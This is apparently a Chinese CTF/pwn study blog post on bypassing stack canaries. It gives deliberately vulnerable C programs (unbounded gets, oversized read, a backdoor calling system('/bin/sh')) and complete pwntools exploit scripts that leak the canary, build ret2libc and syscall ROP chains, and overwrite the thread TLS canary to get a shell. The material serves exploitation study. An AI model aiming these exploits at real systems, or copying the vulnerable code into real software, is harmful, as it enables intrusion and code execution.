绕过canary的奇技淫巧

发表于2026-05-28|更新于2026-05-28|逆向PWN

magic方法ret掉canary判断失败的__stack_chk_failh函数

magic–got修改got表，由于canary再je判断失败的时候会跳转到一个__stack_chk_fail函数，我们直接修改这个函数的got表指向就可以了。

例题(__stack_chk_fail)

#include <stdio.h>

void init(){

    setbuf(stdin, 0);

    setbuf(stdout, 0);

    setbuf(stderr, 0);

}

void vuln(){

    char buf[8];

    puts(“name?”);

    read(0, buf, 0x100);

    printf(“Hello, %s\n”, buf);

    puts(“>>”);

    read(0, buf, 0x100);

}

int main(){

    init();

    vuln();

    return 0;

}

// gcc puts_canary.c -o puts_canary -no-pie

 

from pwn import *

context(os=’linux’,arch=’amd64’,log_level=’debug’)

p = process(‘./puts_canary’)

elf = ELF(‘./puts_canary’)

libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’)

gdb.attach(p,’b *0x401279’)

由于canary最后两位是00，所以要写8个覆盖最后的00

payload1 = b’a’*9

p.sendafter(b’name?\n’,payload1)

读取printf输出的9个a后读取canary

p.recvuntil(b’a’*9)

canary = u64(p.recv(7).rjust(8,b’\x00’))

p.success(“canary –> 0x%x” % canary) #输出canary对比

第二个read打libc先获取函数地址

rdi = 0x401323

ret = 0x40101a

payload2 = b’a’*8 + p64(canary) + p64(0) + p64(rdi) + p64(elf.got[‘puts’]) + p64(elf.sym[‘puts’]) + p64(elf.sym[‘vuln’])

p.sendafter(b’>>\n’,payload2)

计算基地址

puts_address = u64(p.recvuntil(b’\x7f’)[-6:].ljust(8,b’\x00’))

p.success(“puts_address –> 0x%x” % puts_address)

libc_base = puts_address - libc.sym[‘puts’]

p.success(“libc_base –> 0x%x” % libc_base)

system = libc_base + libc.sym[‘system’]

bin_sh = libc_base + next(libc.search(b’/bin/sh\x00’))

由于再调用了一次vuln函数所以要再获取一次canary

payload3 = b’a’*9

p.sendafter(b’name?\n’,payload3)

读取printf输出的9个a后读取canary

p.recvuntil(b’a’*9)

canary2 = u64(p.recv(7).rjust(8,b’\x00’))

p.success(“canary2 –> 0x%x” % canary2) #输出canary对比

继续打libc

paylaod4 = b’a’*8 + p64(canary2) + p64(0) + p64(ret) + p64(rdi) + p64(bin_sh) + p64(system)

p.sendafter(b’>>\n’,paylaod4)  

pause()

p.interactive()

多线程绕过canary的奇技淫巧

在多线程程序中，各个线程之间是自己开闭的一个栈

fs->空间：TLS结构，里面会存放canary。

题型：TLS溢出修改canary。

一般TLS结构体是放在一个开辟的段上，但是由于pthread_create多线程，它会放到栈上。

据说网上传统的方法是爆破，但是有更简便的方法，但是unbuntu22打不了，所以再18版本才可行。但是由于数据覆盖的太多，所以如果要用got，sym找函数会发生错误，所以可以字节去IDA里的.got .plt段找函数地址

例题(phtread)：

#include <stdlib.h>

#include <stdio.h>

#include <unistd.h>

#include <errno.h>

#include <sys/mman.h>

#include <string.h>

char name[0x10];

void init(){

    setbuf(stdin, 0);

    setbuf(stdout, 0);

    setbuf(stderr, 0);

}

int vuln()

{

    char buf[0x20];

    puts(“>>”);

    gets(buf);

    return 0;

}

void backdoor(){

    system(“/bin/sh”);

}

int main()

{

    init();

    long long int num=555,love=520;

    long long int *pointer=#

    pthread_t newthread[5];

    puts(“name?”);

    read(0, name, 8);//由于在IDA查看发现第一个输入保存在了.bss段中所以什么用都没，没漏洞利用

    pthread_create(newthread,0,vuln,0);

    pthread_join(newthread[0], 0LL);

    return 0;

}

在IDA之中分析：

 

IDA发现第一个输入保存在了.bss段中所以什么用都没，没漏洞利用，但是却创建了一个线程vuln，点进去看发下gets函数又有栈溢出漏洞。

 

由于存放canary的结构体在栈上，gets可以无限制的溢出，所以直接计算偏移溢出到canary

 

对比计算差距：

 

可见fs段的基地址0x7f2e215ff640+0x28=0x7f2e215ff668和堆栈中的gets的第一个参数0x7f2e215f22差距是0x848，由上图也可知道堆栈中对比的canary位置差距是5行。

看IDA中有后门函数：

 

from pwn import *

context(os=”linux”,arch=’amd64’,log_level=’debug’)

p = process(“./pthread”)

elf = ELF(“./pthread”)

libc = ELF(“/lib/x86_64-linux-gnu/libc.so.6”)

gdb.attach(p,’b vuln’)

payload = ‘a’*0x10

p.sendafter(b’name?\n’,payload)

payload = p64(0)*5 + p64(0x1234) + p64(0) + p64(0x4012b8)#构造canary为0x1234然后ebp为0，返回地址0x4012b8

#由于覆盖的数据过多所以不能用sym,必须自己去IDA找函数地址

payload = payload.ljust(0x868,b’\x00’) + p64(0x1234)#覆盖到fs段的canary

p.sendlineafter(b’>>\n’,payload)

pause()

p.interactive()

如果没有内置函数使用呢，打libc方法如下：

payload += p64(rdi) + p64(elf.got[‘puts’]) + p64(elf.sym[‘puts’]) + p64(elf.sym[‘vuln’])

但是由于覆盖的数据太多，\x7f……….，可知canary被保存到了和libc有关的地址，覆盖太多会导致有些数据被覆盖

后面打直接libc又遇到问题，可以直接去IDA里面找elf.got[‘puts’]，在plt里找elf.sym[‘puts’]，

from pwn import *

context(os=”linux”,arch=’amd64’,log_level=’debug’)

p = process(“./pthread”)

elf = ELF(“./pthread”)

libc = ELF(“/lib/x86_64-linux-gnu/libc.so.6”)

gdb.attach(p,’b vuln’)

payload = b’a’

p.sendafter(b’name?\n’,payload)

ROPgadget –binary ./pthread –only “pop|ret” | grep “ret”

ret = 0x40101a

rdi = 0x4013e3

payload = p64(0)*5 + p64(0x1234) + b’a’*8 #构造canary为0x1234然后ebp为0

payload += p64(rdi) + p64(elf.got[‘puts’]) + p64(elf.sym[‘puts’]) + p64(elf.sym[‘vuln’])

payload += p64(rdi) + p64(0x404020) + p64(0x4010c0) + p64(elf.sym[‘vuln’])

payload = payload.ljust(0x868,b’\x00’) + p64(0x1234)#覆盖到fs段的canary

p.sendlineafter(b’>>\n’,payload)

puts_address = u64(p.recvuntil(b’\x7f’)[-6:].ljust(8,b’\x00’))

libc_base = puts_address - libc.sym[‘puts’]

system = libc_base + libc.sym[‘system’]

bin_sh = libc_base + next(libc.search(b’/bin/sh\x00’))

payload = b’a’*0x28 + p64(0x1234) + p64(0)

payload += p64(ret) + p64(rdi) + p64(bin_sh) + p64(system)

payload = payload.ljust(0x848,b’\x00’) + p64(0x1234)#第二次差距可能个改变，调试一下计算。

p.sendlineafter(b’>>\n’,payload)

pause()

p.interactive()

但是又是又会莫名其妙的打不通，可用用syscall解决（构造libc的ROP链来手动构造shellcode）

ROPgadget  –binary  /lib/x86_64-linux.so.6 –only “rop|ret”

rax = libc_base + 0x1b500

。。。。。。

payload += p64 (rax) + p64(0x3b) + p64(rdi) + p64(bin_sh) + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(syscall)

还一种方法是通过mprotext函数开辟一个新的段，并提权，植入shellcode并执行。0x404000页对其机制末位三位一定是0，0x1000代表开辟的段的长度，7是权限。最后要调用gets写入shellcode,最后跳转到0x404000

 

ps: 总共有六种方法，还有一种只在unbuntu16上能用的方法，课后可以自己再学习补充挖坑

关于pwn后的一些总结
1、ret2text漏洞利用依赖于程序中存在执行system(“/bin/sh”)的函数，但是没有这个函数，就可以用ret2shellcode和ret2libc方法。  2、ret2shellcode局限性是前提程序没有开启NX保护而且要知道写入shellcode的栈地址和偏移，但是要有可执行权限，也就是没有开启NX保护  3、ret2libc是依赖动态链接库，通过已执行函数的got表计算libc_base基地址，然加libc函数偏移地址得到函数地址，适用开启了NX保护，想办法调用execve(“/bin/sh”,null,null);  4、printf可以利用栈溢出漏洞，泄露canary保护  5、ret2syscall区别是，它是静态链接程序，上面的都是动态链接，可以适用开启了NX保护，由于没有执行权限，所以不能构造shellcode执行，但是能通过对栈的操纵，构造ROP链最终调用syscall // gcc ret2shellcode.c -o ret2shellcode -fno-stack-protector...
